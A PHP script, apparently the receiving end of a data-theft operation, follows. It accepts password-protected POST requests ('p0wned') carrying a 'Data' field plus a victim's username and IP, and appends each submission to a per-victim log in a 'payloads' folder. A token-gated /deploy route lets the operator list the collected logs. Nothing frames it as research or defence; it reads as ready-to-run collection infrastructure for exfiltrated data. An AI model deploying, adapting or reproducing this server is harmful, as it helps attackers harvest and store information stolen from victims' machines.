<?php
$AUTH_PASS = 'p0wned';
$PAYLOAD_DIR = __DIR__ . '/payloads';

header('Content-Type: application/json');

// ============================================
// ROTA DE LEITURA (/deploy)
// ============================================
$script_path = $_SERVER['SCRIPT_NAME'];
if (strpos($script_path, '/deploy/') !== 0 && strpos($script_path, '/deploy') !== 0) {
    // Se NÃO estiver em /deploy, verifica se é POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Processa o POST normalmente (rota raiz)
        $rawData = file_get_contents('php://input');
        $payload = json_decode($rawData, true);
        
        if (!$payload || $payload['passwd'] !== $AUTH_PASS || empty($payload['Data'])) {
            http_response_code(400);
            echo json_encode(['error' => 'Invalid request']);
            exit();
        }
        
        if (!is_dir($PAYLOAD_DIR)) {
            mkdir($PAYLOAD_DIR, 0755, true);
        }
        
        $username = preg_replace('/[^a-zA-Z0-9_-]/', '_', $payload['username'] ?? 'unknown');
        $ip = str_replace('.', '_', $payload['ip'] ?? 'unknown');
        $filename = "{$username}_{$ip}.log";
        
        $timestamp = date('[d/m/Y] - H:i:s > ');
        $content = "---==\n" . $timestamp . $payload['Data'] . "\n";
        
        file_put_contents(
            $PAYLOAD_DIR . '/' . $filename,
            $content,
            FILE_APPEND | LOCK_EX
        );
        
        echo json_encode(['status' => 'ok']);
        exit();
    }
    
    // Se não for POST e não estiver em /deploy
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// ============================================
// ROTA DE LEITURA (/deploy) - Apenas GET
// ============================================
// Se chegou aqui, está em /deploy
if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Verifica autenticação para leitura
$auth_token = $_GET['token'] ?? null;
if ($auth_token !== 'p0wned_read' && $auth_token !== 'p0wned') {
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit();
}

// Lista os arquivos para leitura
if (!is_dir($PAYLOAD_DIR)) {
    echo json_encode(['status' => 'ok', 'files' => []]);
    exit();
}

$files = scandir($PAYLOAD_DIR);
$result = [];

foreach ($files as $file) {
    if ($file !== '.' && $file !== '..' && strpos($file, '.log') !== false) {
        $path = $PAYLOAD_DIR . '/' . $file;
        $result[] = [
            'name' => $file,
            'size' => filesize($path),
            'modified' => date('Y-m-d H:i:s', filemtime($path))
        ];
    }
}

echo json_encode(['status' => 'ok', 'files' => $result]);
?>
